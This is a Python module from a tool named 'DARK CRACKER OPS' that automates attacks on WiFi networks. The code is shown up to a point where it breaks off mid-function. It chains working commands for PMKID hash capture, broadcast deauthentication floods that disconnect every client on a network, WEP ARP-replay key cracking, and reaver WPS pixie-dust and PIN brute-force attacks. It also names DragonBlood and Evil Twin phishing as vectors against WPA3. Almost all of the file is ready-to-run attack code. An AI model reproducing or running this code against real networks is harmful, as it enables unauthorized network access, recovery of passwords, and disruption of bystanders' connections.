"""
modules/attack_engine.py — DARK CRACKER OPS Generation 2
Master attack orchestrator for automated WiFi penetration testing.
Supports WEP, WPA/WPA2 (PMKID + handshake), WPA3, and WPS (pixie-dust + brute).
"""

import csv
import io
import os
import re
import shutil
import subprocess
import tempfile
import time
from typing import Callable, Optional

from core.worker import BaseWorker
from core.config import TOOLS
from core.logger import get_logger

log = get_logger("attack_engine")


class AutoAttackEngine(BaseWorker):
    """
    Automated WiFi attack orchestrator.

    Attack selection logic (mode == "Auto"):
      WEP  → ARP-replay IV flooding → aircrack-ng
      WPA3 → SAE transition check → PMKID
      WPS  → Pixie-dust → full PIN brute force
      WPA2 → PMKID (hcxdumptool) → Handshake (deauth)

    Callbacks:
        on_log(str, str)        — (tag, message) for terminal widget
        on_progress(int)        — 0-100 percent
        on_phase(str)           — human-readable phase description
        on_capture(str, str)    — (file_path, capture_type)
        on_finished(bool)       — True = success / crack attempt ready
        on_pmkid(str)           — path to .hc22000 hash file
        on_handshake(str)       — path to .cap file
        on_wps_pin(str)         — "PIN:12345678 PSK:MyPassword"
    """

    def __init__(
        self,
        config: dict,
        on_log: Optional[Callable] = None,
        on_progress: Optional[Callable] = None,
        on_phase: Optional[Callable] = None,
        on_capture: Optional[Callable] = None,
        on_finished: Optional[Callable] = None,
        on_pmkid: Optional[Callable] = None,
        on_handshake: Optional[Callable] = None,
        on_wps_pin: Optional[Callable] = None,
    ):
        """
        config keys:
            interface  str   — monitor-mode interface (e.g. wlan0mon)
            bssid      str   — target AP MAC address
            ssid       str   — target SSID (for logging)
            channel    int   — target channel
            enc        str   — encryption type string (WEP / WPA2 / WPA3 …)
            wordlist   str   — path to wordlist (used by cracker, not here)
            mode       str   — Auto | WPA2 | WEP | WPA3 | WPS
            timeout    int   — global timeout in seconds (default 300)
        """
        super().__init__()
        self.config       = config
        self.on_log       = on_log
        self.on_progress  = on_progress
        self.on_phase     = on_phase
        self.on_capture   = on_capture
        self.on_finished  = on_finished
        self.on_pmkid     = on_pmkid
        self.on_handshake = on_handshake
        self.on_wps_pin   = on_wps_pin
        self._procs: list[subprocess.Popen] = []
        self._tmpdir  = tempfile.mkdtemp(prefix="dc_attack_")

    # ── Properties ────────────────────────────────────────────────────────────

    @property
    def _iface(self) -> str:
        return self.config.get("interface", "wlan0mon")

    @property
    def _bssid(self) -> str:
        return self.config.get("bssid", "").upper()

    @property
    def _channel(self) -> int:
        try:
            return int(self.config.get("channel", 6))
        except (TypeError, ValueError):
            return 6

    @property
    def _ssid(self) -> str:
        return self.config.get("ssid", "<unknown>")

    @property
    def _timeout(self) -> int:
        try:
            return int(self.config.get("timeout", 300))
        except (TypeError, ValueError):
            return 300

    # ── Thread entry point ────────────────────────────────────────────────────

    def run(self):
        enc  = self.config.get("enc", "").upper()
        mode = self.config.get("mode", "Auto")

        self._call(self.on_log, "ENGINE",
            f"Attack started — Target: {self._ssid} ({self._bssid}) | Mode: {mode}")
        self._call(self.on_progress, 2)

        auth = self.config.get("auth", "").upper()
        cipher = self.config.get("cipher", "").upper()

        try:
            if mode == "Auto":
                # WPA Enterprise detection
                if "MGT" in auth or "EAP" in auth:
                    self._attack_enterprise()
                elif "WEP" in enc:
                    self._attack_wep()
                elif "WPA3" in enc:
                    self._attack_wpa3()
                elif self.config.get("wps") or self._check_wps():
                    # WPS enabled — try WPS first
                    self._attack_wps()
                else:
                    # WPA2/WPA: try PMKID, auto-fallback to handshake
                    pmkid_ok = self._attack_pmkid()
                    if not pmkid_ok and not self.is_stopped():
                        self._call(self.on_log, "ENGINE",
                            "PMKID capture failed — falling back to handshake capture")
                        self._attack_handshake()

            elif mode == "WEP":
                self._attack_wep()
            elif mode == "WPA3":
                self._attack_wpa3()
            elif mode == "WPS":
                self._attack_wps()
            else:
                # WPA2 / WPA / manual — try PMKID with auto-fallback
                pmkid_ok = self._attack_pmkid()
                if not pmkid_ok and not self.is_stopped():
                    self._attack_handshake()

        except Exception as exc:
            log.exception("AutoAttackEngine.run() unhandled exception")
            self._call(self.on_log, "ERROR", f"Unhandled exception: {exc}")
            self._call(self.on_finished, False)
        finally:
            self._cleanup_procs()

    # ── PMKID attack ──────────────────────────────────────────────────────────

    def _attack_pmkid(self) -> bool:
        """
        Capture PMKID using hcxdumptool.
        Returns True if a hash file with content was produced.
        """
        self._call(self.on_phase, "PMKID Capture")
        self._call(self.on_log, "PMKID", "Starting PMKID capture (hcxdumptool)…")
        self._call(self.on_progress, 10)

        hcxdump  = TOOLS.get("hcxdumptool",   "hcxdumptool")
        hcxpcap  = TOOLS.get("hcxpcapngtool", "hcxpcapngtool")

        pcap_out  = os.path.join(self._tmpdir, "dc_capture.pcapng")
        hash_out  = os.path.join(self._tmpdir, "dc_hash.hc22000")
        bpf_file  = os.path.join(self._tmpdir, "target.bpf")

        # Build BPF filter targeting the AP BSSID (hcxdumptool v7+ API).
        # wlan addr3 matches the BSSID field in management frames (beacons,
        # probe responses, EAPOLs) that the AP transmits.
        bssid_no_colons = self._bssid.replace(":", "").lower()
        bpf_filter_str  = f"wlan addr3 {bssid_no_colons}"
        rc_bpf, bpf_out, _ = self._run_sync(
            [hcxdump, f"--bpfc={bpf_filter_str}"], timeout=10
        )
        if rc_bpf == 0 and bpf_out.strip():
            with open(bpf_file, "w") as fh:
                fh.write(bpf_out)
            bpf_args = [f"--bpf={bpf_file}"]
        else:
            # BPF compile failed — run without filter (capture all)
            bpf_args = []
            self._call(self.on_log, "PMKID", "BPF compile failed — capturing without BSSID filter")

        # Lock to the target channel; hcxdumptool v7 needs band suffix:
        #   'a' = NL80211_BAND_2GHZ (channels 1-14)
        #   'b' = NL80211_BAND_5GHZ (channels 36+)
        ch = self._channel
        band = "b" if ch >= 36 else "a"
        channel_arg = f"{ch}{band}"

        cmd = [
            hcxdump,
            "-i", self._iface,
            "-w", pcap_out,        # v7: -w (was -o in older versions)
            "-c", channel_arg,     # lock channel so we don't miss frames
            "--tot=2",             # 2-minute timeout (was --timeout=60s)
            "--exitoneapol=3",     # exit on first PMKID (1) or M1M2M3 (2)
        ] + bpf_args

        self._call(self.on_log, "PMKID", f"hcxdumptool running — 2 min timeout (ch {channel_arg})")
        proc = self._popen(cmd)   # DEVNULL — we don't read hcxdumptool stdout
        if not proc:
            self._call(self.on_log, "ERROR", "hcxdumptool not found or failed to start")
            return False

        # Wait up to 130 s (2 min + buffer for --exitoneapol early exit)
        deadline = time.time() + 130
        while time.time() < deadline and not self.is_stopped():
            time.sleep(2)
            if proc.poll() is not None:
                break
            elapsed_pct = min(40, 10 + int((time.time() - (deadline - 130)) / 130 * 30))
            self._call(self.on_progress, elapsed_pct)

        if self.is_stopped():
            proc.terminate()
            return False

        self._kill_proc(proc)
        self._call(self.on_progress, 42)

        if not os.path.exists(pcap_out) or os.path.getsize(pcap_out) == 0:
            self._call(self.on_log, "PMKID", "No pcapng captured — target may not be in range")
            return False

        # Convert pcapng to hashcat 22000 format
        conv_cmd = [hcxpcap, "-o", hash_out, pcap_out]
        self._call(self.on_log, "PMKID", "Converting pcapng → hc22000 hash…")
        rc, out, err = self._run_sync(conv_cmd, timeout=30)

        if not os.path.exists(hash_out) or os.path.getsize(hash_out) == 0:
            self._call(self.on_log, "PMKID", "Conversion produced empty hash file — no PMKID extracted")
            return False

        self._call(self.on_log, "PMKID", f"Hash file ready: {hash_out}")
        self._call(self.on_progress, 50)
        self._call(self.on_pmkid, hash_out)
        self._call(self.on_capture, hash_out, "pmkid")
        self._call(self.on_finished, True)
        return True

    # ── Handshake attack ──────────────────────────────────────────────────────

    def _verify_channel(self) -> int:
        """
        Confirm the AP's actual broadcast channel by passively sniffing beacons
        for 8 seconds with airodump-ng (no channel lock) and reading the CSV.
        Returns the verified channel number, or self._channel if unconfirmed.
        """
        airodump = TOOLS.get("airodump", "airodump-ng")
        verify_prefix = os.path.join(self._tmpdir, "dc_verify_ch")
        verify_csv    = verify_prefix + "-01.csv"

        cmd = [
            airodump,
            "--write", verify_prefix,
            "--output-format", "csv",
            "--write-interval", "2",
            self._iface,           # no -c → full channel hopping
        ]
        proc = self._popen(cmd)
        if not proc:
            return self._channel

        self._interruptible_sleep(8)
        self._kill_proc(proc)

        if not os.path.exists(verify_csv):
            return self._channel

        try:
            with open(verify_csv, "r", errors="replace") as fh:
                raw = fh.read()
            import csv, io, re as _re
            sections = _re.split(r"\n\s*\n", raw, maxsplit=1)
            reader = csv.reader(io.StringIO(sections[0]))
            for row in reader:
                if len(row) < 4:
                    continue
                bssid = row[0].strip().upper()
                if bssid == self._bssid:
                    try:
                        ch = int(row[3].strip())
                        if ch > 0:
                            return ch
                    except ValueError:
                        pass
        except Exception:
            pass

        return self._channel

    def _attack_handshake(self):
        """
        Capture WPA handshake via deauthentication + airodump-ng.
        Polls for EAPOL frames in the output .cap file.
        """
        self._call(self.on_phase, "Handshake Capture")
        self._call(self.on_log, "HANDSHAKE", "Starting handshake capture…")
        self._call(self.on_progress, 10)

        airodump = TOOLS.get("airodump", "airodump-ng")
        aireplay = TOOLS.get("aireplay", "aireplay-ng")

        # Verify the AP's actual channel via a brief passive sniff before locking.
        # The wifi_scanner may report the channel where a beacon was first heard
        # during hopping, which can differ from the AP's primary channel.
        self._call(self.on_log, "HANDSHAKE", "Verifying AP channel via passive sniff…")
        actual_ch = self._verify_channel()
        if self.is_stopped():
            return
        if actual_ch != self._channel:
            self._call(self.on_log, "HANDSHAKE",
                f"Channel corrected: scanner reported {self._channel}, "
                f"beacon confirms {actual_ch}")
            self.config["channel"] = actual_ch
        else:
            self._call(self.on_log, "HANDSHAKE",
                f"Channel confirmed: {actual_ch}")

        cap_prefix = os.path.join(self._tmpdir, "dc_handshake")
        cap_file   = cap_prefix + "-01.cap"

        dump_cmd = [
            airodump,
            "-c", str(self._channel),
            "--bssid", self._bssid,
            "-w", cap_prefix,
            "--output-format", "cap",
            self._iface,
        ]

        self._call(self.on_log, "HANDSHAKE",
            f"airodump-ng → ch {self._channel} | BSSID {self._bssid}")
        dump_proc = self._popen(dump_cmd)
        if not dump_proc:
            self._call(self.on_log, "ERROR", "airodump-ng not found or failed to start")
            self._call(self.on_finished, False)
            return

        # Wait 5 s for airodump to lock on the channel
        self._interruptible_sleep(5)
        if self.is_stopped():
            self._kill_proc(dump_proc)
            return

        # Send deauth burst every 15 s (up to self._timeout total or max_deauth_rounds)
        deauth_interval   = 15
        deadline          = time.time() + self._timeout
        deauth_sent       = 0
        max_deauth_rounds = int(self.config.get("max_deauth_rounds", 20))

        while time.time() < deadline and not self.is_stopped() and deauth_sent < max_deauth_rounds:
            # Fire deauth — 100 frames is aggressive enough to force any
            # connected client (phone, laptop, IoT) to drop and re-associate.
            # Broadcast (-a only, no -c) deauths ALL connected clients at once.
            deauth_cmd = [
                aireplay,
                "--deauth", "100",
                "-a", self._bssid,
                self._iface,
            ]
            self._call(self.on_log, "HANDSHAKE",
                f"Sending deauth burst #{deauth_sent + 1} to {self._bssid}")
            deauth_proc = self._popen(deauth_cmd)
            self._interruptible_sleep(3)
            if deauth_proc:
                self._kill_proc(deauth_proc)
            deauth_sent += 1

            # Check if .cap file has grown and contains a complete handshake.
            # _check_eapol requires >= 2 EAPOL frames (tshark) or an explicit
            # "1 handshake" confirmation from aircrack-ng — a lone EAPOL msg-1
            # from the AP does NOT count as a crackable capture.
            cap_size = os.path.getsize(cap_file) if os.path.exists(cap_file) else 0
            if cap_size > 0:
                has_eapol = self._check_eapol(cap_file)
                elapsed_pct = min(90, 10 + int(
                    (1 - (deadline - time.time()) / self._timeout) * 80
                ))
                self._call(self.on_progress, elapsed_pct)

                if has_eapol:
                    self._call(self.on_log, "HANDSHAKE",
                        f"Complete EAPOL handshake captured! ({cap_file})")
                    self._call(self.on_progress, 100)
                    self._call(self.on_handshake, cap_file)
                    self._call(self.on_capture, cap_file, "handshake")
                    self._kill_proc(dump_proc)
                    self._call(self.on_finished, True)
                    return
                elif cap_size > 0:
                    self._call(self.on_log, "HANDSHAKE",
                        "Partial EAPOL frames in cap — handshake incomplete. "
                        "Sending another deauth burst…")

            self._interruptible_sleep(max(0, deauth_interval - 3))

        self._kill_proc(dump_proc)
        if not self.is_stopped():
            if deauth_sent >= max_deauth_rounds:
                self._call(self.on_log, "HANDSHAKE",
                    f"Max deauth rounds ({max_deauth_rounds}) reached — no handshake captured. "
                    "No active client responded. AP may have no connected clients.")
            else:
                self._call(self.on_log, "HANDSHAKE",
                    "Timeout reached — no handshake captured. "
                    "Ensure clients are associated to the AP.")

            # Last-resort: run hcxpcapngtool on the partial .cap file.
            # Some APs embed PMKID inside their EAPOL M1 frame — hcxpcapngtool
            # can extract it even from an incomplete/partial capture.
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
                hcxpcap   = TOOLS.get("hcxpcapngtool", "hcxpcapngtool")
                hash_out  = os.path.join(self._tmpdir, "dc_partial_hash.hc22000")
                self._call(self.on_log, "HANDSHAKE",
                    "Trying to extract PMKID from partial capture with hcxpcapngtool…")
                rc, _, _ = self._run_sync([hcxpcap, "-o", hash_out, cap_file], timeout=30)
                if os.path.exists(hash_out) and os.path.getsize(hash_out) > 0:
                    self._call(self.on_log, "HANDSHAKE",
                        f"PMKID extracted from partial capture! Hash: {hash_out}")
                    self._call(self.on_pmkid, hash_out)
                    self._call(self.on_capture, hash_out, "pmkid")
                    self._call(self.on_finished, True)
                    return
                else:
                    self._call(self.on_log, "HANDSHAKE",
                        "No PMKID in partial capture. Connect a device to the AP and retry.")

            self._call(self.on_finished, False)

    def _check_eapol(self, cap_file: str) -> bool:
        """
        Check for a *complete* EAPOL handshake in a .cap file.
        Uses tshark (preferred) or aircrack-ng as fallback.

        A complete 4-way handshake requires at least 2 distinct EAPOL frames
        (frames 2+3 or 2+4) for aircrack-ng to be able to verify a passphrase.
        Requiring >= 2 frames guards against false-positives from lone beacons
        or a single deauth-triggered EAPOL msg-1 that never completed.

        NOTE: "potential targets" in aircrack-ng output only means WPA material
        is present — it does NOT confirm a crackable complete handshake.
        Only "1 handshake" / "handshakes" in aircrack-ng output is authoritative.
        """
        # Primary: tshark — count actual EAPOL frames; need >= 2 for a usable
        # handshake (minimum: EAPOL msg-2 + msg-3, or msg-2 + msg-4).
        rc_ts, ts_out, _ = self._run_sync(
            ["tshark", "-r", cap_file, "-Y", "eapol",
             "-T", "fields", "-e", "frame.number"],
            timeout=10
        )
        if rc_ts == 0 and ts_out.strip():
            frame_count = len([f for f in ts_out.strip().splitlines() if f.strip()])
            if frame_count >= 2:
                return True

        # Fallback: aircrack-ng — only accept an *explicit* confirmed handshake.
        # "potential targets" is intentionally excluded: it means there is WPA
        # material in the cap but aircrack-ng cannot confirm a complete handshake.
        aircrack = TOOLS.get("aircrack", "aircrack-ng")
        rc, stdout, stderr = self._run_sync(
            [aircrack, cap_file, "-b", self._bssid], timeout=10
        )
        combined = (stdout + stderr).lower()
        return (
            "1 handshake" in combined
            or "handshakes" in combined
            or "eapol" in combined
        )

    # ── WEP attack ────────────────────────────────────────────────────────────

    def _attack_wep(self):
        """
        WEP cracking: fake auth → ARP replay → aircrack-ng.
        Polls IV count from airodump CSV; cracks once IVs > 5000.
        """
        self._call(self.on_phase, "WEP Attack")
        self._call(self.on_log, "WEP", "Starting WEP attack (ARP replay)…")
        self._call(self.on_progress, 5)

        airodump = TOOLS.get("airodump", "airodump-ng")
        aireplay = TOOLS.get("aireplay", "aireplay-ng")
        aircrack = TOOLS.get("aircrack", "aircrack-ng")

        cap_prefix = os.path.join(self._tmpdir, "dc_wep")
        csv_file   = cap_prefix + "-01.csv"
        cap_file   = cap_prefix + "-01.cap"

        # Start airodump-ng capture
        dump_cmd = [
            airodump,
            "-c", str(self._channel),
            "--bssid", self._bssid,
            "-w", cap_prefix,
            "--output-format", "csv,cap",
            "--write-interval", "5",
            self._iface,
        ]
        self._call(self.on_log, "WEP", "airodump-ng capture started")
        dump_proc = self._popen(dump_cmd)
        if not dump_proc:
            self._call(self.on_log, "ERROR", "airodump-ng not found")
            self._call(self.on_finished, False)
            return

        self._interruptible_sleep(3)
        if self.is_stopped():
            self._kill_proc(dump_proc)
            return

        # Fake authentication
        self._call(self.on_log, "WEP", "Attempting fake authentication…")
        fakeauth_cmd = [aireplay, "-1", "0", "-a", self._bssid, self._iface]
        fa_proc = self._popen(fakeauth_cmd)
        self._interruptible_sleep(5)
        self._kill_proc(fa_proc)

        # ARP replay attack
        self._call(self.on_log, "WEP", "Starting ARP replay injection…")
        arp_cmd = [aireplay, "-3", "-b", self._bssid, self._iface]
        arp_proc = self._popen(arp_cmd)

        iv_target  = 5000
        deadline   = time.time() + self._timeout
        last_ivs   = 0

        while time.time() < deadline and not self.is_stopped():
            self._interruptible_sleep(5)
            if self.is_stopped():
                break

            ivs = self._read_ivs_from_csv(csv_file)
            if ivs > last_ivs:
                self._call(self.on_log, "WEP",
                    f"IVs collected: {ivs:,} / {iv_target:,}")
                last_ivs = ivs

            pct = min(85, int((ivs / iv_target) * 85))
            self._call(self.on_progress, pct)

            if ivs >= iv_target:
                break

        self._kill_proc(arp_proc)

        if self.is_stopped():
            self._kill_proc(dump_proc)
            return

        if last_ivs < iv_target:
            self._call(self.on_log, "WEP",
                f"Only {last_ivs:,} IVs collected — attempting crack anyway…")

        self._kill_proc(dump_proc)

        # Crack with aircrack-ng
        self._call(self.on_phase, "WEP Cracking")
        self._call(self.on_log, "WEP", "Running aircrack-ng against captured IVs…")
        self._call(self.on_progress, 88)

        crack_cmd = [aircrack, "-b", self._bssid, cap_file]
        rc, stdout, stderr = self._run_sync(crack_cmd, timeout=120)
        combined = stdout + stderr

        # Parse key from aircrack output:
        # "KEY FOUND! [ AB:CD:EF:01:23 ]"
        key_m = re.search(r"KEY FOUND!\s*\[\s*([\w\s:]+?)\s*\]", combined, re.IGNORECASE)
        if key_m:
            wep_key = key_m.group(1).strip()
            self._call(self.on_log, "WEP", f"WEP key cracked: {wep_key}")
            self._call(self.on_capture, cap_file, "wep_cracked")
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
        else:
            self._call(self.on_log, "WEP", "aircrack-ng could not recover the key. More IVs needed.")
            self._call(self.on_finished, False)

    def _read_ivs_from_csv(self, csv_path: str) -> int:
        """Extract IV count for target BSSID from airodump CSV."""
        if not os.path.exists(csv_path):
            return 0
        try:
            with open(csv_path, "r", errors="replace") as fh:
                content = fh.read()
            sections = re.split(r"\n\s*\n", content, maxsplit=1)
            ap_section = sections[0]
            reader = csv.reader(io.StringIO(ap_section))
            for row in reader:
                if len(row) < 11:
                    continue
                bssid = row[0].strip().upper()
                if bssid == self._bssid:
                    try:
                        return int(row[10].strip())
                    except ValueError:
                        return 0
        except Exception:
            pass
        return 0

    # ── WPA3 attack ───────────────────────────────────────────────────────────

    def _attack_wpa3(self):
        """
        WPA3 attack strategy:
          1. Detect SAE transition mode via beacon inspection
          2. If transition mode active → attempt WPA2 association + PMKID
          3. Report results (WPA3-only is largely resistant to offline attack)
        """
        self._call(self.on_phase, "WPA3 Analysis")
        self._call(self.on_log, "WPA3", "Analysing WPA3 target…")
        self._call(self.on_progress, 10)

        transition = self._detect_wpa3_transition()
        self._call(self.on_progress, 30)

        if transition:
            self._call(self.on_log, "WPA3",
                "SAE Transition Mode detected — AP also accepts WPA2. "
                "Attempting PMKID capture via WPA2 handshake…")
            self._call(self.on_progress, 40)
            success = self._attack_pmkid()
            if not success and not self.is_stopped():
                self._call(self.on_log, "WPA3",
                    "PMKID capture failed. Attempting WPA2 handshake capture…")
                self._attack_handshake()
        else:
            self._call(self.on_log, "WPA3",
                "Pure WPA3-SAE detected. Offline dictionary attacks are infeasible.")
            self._call(self.on_log, "WPA3",
                "Recommended vectors: DragonBlood (CVE-2019-9494/9496), "
                "client-side phishing (Evil Twin), or physical access.")
            self._call(self.on_progress, 100)
            self._call(self.on_finished, False)

    def _detect_wpa3_transition(self) -> bool:
        """
        Sniff one beacon from the target BSSID for SAE transition mode.
        Uses a short tcpdump/tshark capture. Returns True if transition mode found.
        """
        tshark = shutil.which("tshark")
        if not tshark:
            self._call(self.on_log, "WPA3", "tshark not found — skipping beacon inspection")
            return False

        cap_file = os.path.join(self._tmpdir, "beacon_check.pcapng")
        cmd = [
            tshark, "-i", self._iface,
            "-a", "duration:10",
            "-f", f"ether host {self._bssid} and type mgt subtype beacon",
            "-w", cap_file,
        ]
        proc = self._popen(cmd)
        self._interruptible_sleep(12)
        self._kill_proc(proc)

        if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
            return False

        # Read back and check for RSN AKMS: SAE (8) and PSK (2) simultaneously
        rc, out, _ = self._run_sync(
            [tshark, "-r", cap_file,
             "-Y", f"wlan.bssid == {self._bssid.lower()}",
             "-T", "fields",
             "-e", "wlan.rsn.akms.type"],
            timeout=10
        )
        # Transition mode: both 00:0f:ac:02 (PSK) and 00:0f:ac:08 (SAE) present
        has_psk = re.search(r"\b2\b", out) is not None
        has_sae = re.search(r"\b8\b", out) is not None
        return has_psk and has_sae

    # ── WPS detection ─────────────────────────────────────────────────────────

    def _check_wps(self) -> bool:
        """
        Use wash to check if the target AP has WPS enabled.
        Returns True if WPS is enabled and unlocked.
        """
        wash = TOOLS.get("wash", "wash")
        if not shutil.which(wash):
            self._call(self.on_log, "WPS", "wash not found — skipping WPS check")
            return False

        self._call(self.on_log, "WPS", "Checking for WPS support via wash…")
        cmd = [wash, "-i", self._iface, "-C", "-s"]
        proc = self._popen(cmd)   # DEVNULL — result captured via _run_sync below
        self._interruptible_sleep(15)
        self._kill_proc(proc)

        # Re-run wash briefly and capture stdout
        rc, stdout, _ = self._run_sync(
            [wash, "-i", self._iface, "-C", "-s"], timeout=12
        )

        for line in (stdout or "").splitlines():
            if self._bssid.replace(":", "").lower() in line.lower() or \
               self._bssid.lower() in line.lower():
                # Check Lck (locked) field
                fields = line.split()
                # wash output columns: BSSID Ch dBm WPS Lck Vendor ESSID
                if len(fields) >= 5:
                    locked = fields[4].strip().upper()
                    wps_ver = fields[3].strip()
                    if locked not in ("YES", "Y", "1"):
                        self._call(self.on_log, "WPS",
                            f"WPS enabled (v{wps_ver}), not locked — proceeding")
                        return True
                    else:
                        self._call(self.on_log, "WPS", "WPS is locked on this AP")
                        return False
                return True

        self._call(self.on_log, "WPS", "WPS not detected on target AP")
        return False

    # ── WPS attack ────────────────────────────────────────────────────────────

    def _attack_wps(self):
        """
        WPS attack:
          Phase 1: Pixie-dust (instantaneous if vulnerable)
          Phase 2: Full PIN brute-force (reaver)
        """
        self._call(self.on_phase, "WPS Pixie-Dust")
        self._call(self.on_log, "WPS", "Starting WPS Pixie-Dust attack…")
        self._call(self.on_progress, 10)

        reaver = TOOLS.get("reaver", "reaver")
        if not shutil.which(reaver):
            self._call(self.on_log, "ERROR", "reaver not found — cannot perform WPS attack")
            self._call(self.on_finished, False)
            return

        # --- Phase 1: Pixie-Dust ---
        pixie_cmd = [
            reaver,
            "-i", self._iface,
            "-b", self._bssid,
            "-c", str(self._channel),
            "-vv",
            "-K", "1",   # Pixie-Dust mode
            "-N",        # No associated client required
        ]

        self._call(self.on_log, "WPS", f"Pixie-Dust attack on {self._bssid} (30s timeout)…")
        pixie_proc = self._popen(pixie_cmd, capture=True)
        if not pixie_proc:
            self._call(self.on_log, "ERROR", "reaver failed to start")
            self._call(self.on_finished, False)
            return

        pixie_output = []
        pixie_deadline = time.time() + 45
        pin_found = None
        psk_found = None

        while time.time() < pixie_deadline and not self.is_stopped():
            self._interruptible_sleep(2)
            if pixie_proc.poll() is not None:
                break
            # Drain stdout
            if pixie_proc.stdout:
                try:
                    import select
                    ready, _, _ = select.select([pixie_proc.stdout], [], [], 0)
                    if ready:
                        chunk = pixie_proc.stdout.read(4096)
                        if chunk:
                            pixie_output.append(chunk)
                            combined = "".join(pixie_output)
                            pin_m = re.search(r"WPS PIN:\s*'?(\d+)'?", combined, re.IGNORECASE)
                            psk_m = re.search(r"WPA PSK:\s*'?([^\n']+)'?", combined, re.IGNORECASE)
                            if pin_m and psk_m:
                                pin_found = pin_m.group(1).strip()
                                psk_found = psk_m.group(1).strip()
                                break
                except Exception:
                    pass
            pct = min(45, 10 + int((1 - (pixie_deadline - time.time()) / 45) * 35))
            self._call(self.on_progress, pct)

        self._kill_proc(pixie_proc)

        # Read any remaining output
        full_output = "".join(pixie_output)
        if not pin_found:
            pin_m = re.search(r"WPS PIN:\s*'?(\d+)'?", full_output, re.IGNORECASE)
            psk_m = re.search(r"WPA PSK:\s*'?([^\n']+)'?", full_output, re.IGNORECASE)
            if pin_m:
                pin_found = pin_m.group(1).strip()
            if psk_m:
                psk_found = psk_m.group(1).strip()

        if pin_found:
            result = f"PIN:{pin_found}"
            if psk_found:
                result += f" PSK:{psk_found}"
            self._call(self.on_log, "WPS", f"Pixie-Dust SUCCESS — {result}")
            self._call(self.on_wps_pin, result)
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
            return

        self._call(self.on_log, "WPS", "Pixie-Dust failed — AP not vulnerable. Starting full PIN brute…")

        # --- Phase 2: Full PIN brute-force ---
        self._call(self.on_phase, "WPS PIN Brute-Force")
        self._call(self.on_progress, 50)

        brute_cmd = [
            reaver,
            "-i", self._iface,
            "-b", self._bssid,
            "-c", str(self._channel),
            "-vv",
            "-d", "1",    # 1s delay between PINs
            "-r", "3:60", # 3 attempts then 60s sleep (avoid lockout)
        ]

        self._call(self.on_log, "WPS", "Full PIN brute-force started (this may take hours)…")
        brute_proc = self._popen(brute_cmd, capture=True)
        if not brute_proc:
            self._call(self.on_log, "ERROR", "reaver brute-force failed to start")
            self._call(self.on_finished, False)
            return

        brute_output = []
        deadline = time.time() + self._timeout
        pin_found = None
        psk_found = None

        while time.time() < deadline and not self.is_stopped():
            self._interruptible_sleep(5)
            if brute_proc.poll() is not None:
                break

            if brute_proc.stdout:
                try:
                    import select
                    ready, _, _ = select.select([brute_proc.stdout], [], [], 0)
                    if ready:
                        chunk = brute_proc.stdout.read(8192)
                        if chunk:
                            brute_output.append(chunk)
                except Exception:
                    pass

            combined = "".join(brute_output)
            pin_m = re.search(r"WPS PIN:\s*'?(\d+)'?", combined, re.IGNORECASE)
            psk_m = re.search(r"WPA PSK:\s*'?([^\n']+)'?", combined, re.IGNORECASE)

            if pin_m:
                pin_found = pin_m.group(1).strip()
                if psk_m:
                    psk_found = psk_m.group(1).strip()
                break

            # Progress: 50→95 over timeout
            elapsed = time.time() - (deadline - self._timeout)
            pct = min(95, 50 + int((elapsed / self._timeout) * 45))
            self._call(self.on_progress, pct)

            # Parse current attempt from reaver output for logging
            attempt_m = re.search(r"Trying pin\s+(\d+)", combined, re.IGNORECASE)
            if attempt_m:
                self._call(self.on_log, "WPS", f"Trying PIN: {attempt_m.group(1)}")

        self._kill_proc(brute_proc)

        if pin_found:
            result = f"PIN:{pin_found}"
            if psk_found:
                result += f" PSK:{psk_found}"
            self._call(self.on_log, "WPS", f"WPS brute-force SUCCESS — {result}")
            self._call(self.on_wps_pin, result)
            self._call(self.on_progress, 100)
            self._call(self.on_finished, True)
        else:
            if self.is_stopped():
                return
            self._call(self.on_log, "WPS",
                "WPS brute-force timeout/failed — AP may be locked or rate-limiting")
            self._call(self.on_finished, False)

    # ── PMKID targeted (single-target, 60s timeout) ───────────────────────────

    def _pmkid_targeted(self) -> bool:
        """
        Single-target PMKID capture with 60s timeout.
        Provides progress updates every 5s.
        Falls back to handshake immediately if 0 bytes captured after 30s.
        Returns True if a usable hash file was produced.
        """
        self._call(self.on_phase, "PMKID Targeted Capture")
        self._call(self.on_log, "PMKID", "Starting targeted PMKID capture (2 min timeout)…")
        self._call(self.on_progress, 10)

        hcxdump  = TOOLS.get("hcxdumptool",   "hcxdumptool")
        hcxpcap  = TOOLS.get("hcxpcapngtool", "hcxpcapngtool")

        pcap_out  = os.path.join(self._tmpdir, "dc_targeted_pmkid.pcapng")
        hash_out  = os.path.join(self._tmpdir, "dc_targeted_pmkid.hc22000")
        bpf_file  = os.path.join(self._tmpdir, "targeted.bpf")

        # Build BPF for hcxdumptool v7+ (replaces --filterlist_ap / --filtermode)
        bssid_no_colons = self._bssid.replace(":", "").lower()
        rc_bpf, bpf_out, _ = self._run_sync(
            [hcxdump, f"--bpfc=wlan addr3 {bssid_no_colons}"], timeout=10
        )
        if rc_bpf == 0 and bpf_out.strip():
            with open(bpf_file, "w") as fh:
                fh.write(bpf_out)
            bpf_args = [f"--bpf={bpf_file}"]
        else:
            bpf_args = []

        ch   = self._channel
        band = "b" if ch >= 36 else "a"

        cmd = [
            hcxdump,
            "-i", self._iface,
            "-w", pcap_out,            # v7: -w (not -o)
            "-c", f"{ch}{band}",
            "--tot=2",                 # 2-minute timeout (was --timeout=60)
            "--exitoneapol=3",         # exit on PMKID or M1M2M3
        ] + bpf_args

        proc = self._popen(cmd)        # DEVNULL — not reading stdout
        if not proc:
            self._call(self.on_log, "ERROR", "hcxdumptool not found — cannot run targeted PMKID")
            return False

        start_time = time.time()
        deadline   = start_time + 130  # 2 min + buffer

        while time.time() < deadline and not self.is_stopped():
            self._interruptible_sleep(5)
            elapsed = time.time() - start_time

            pcap_size = os.path.getsize(pcap_out) if os.path.exists(pcap_out) else 0
            pct = min(48, 10 + int(elapsed / 120 * 38))
            self._call(self.on_progress, pct)
            self._call(self.on_log, "PMKID",
                f"PMKID capture — elapsed {elapsed:.0f}s / 120s | pcap {pcap_size} bytes")

            # Immediate fallback: if 0 bytes after 60s, switch to handshake
            if elapsed >= 60 and pcap_size == 0:
                self._call(self.on_log, "PMKID",
                    "No data captured after 30s — falling back to handshake immediately")
                self._kill_proc(proc)
                self._attack_handshake()
                return False

            if proc.poll() is not None:
                break

        self._kill_proc(proc)

        if self.is_stopped():
            return False

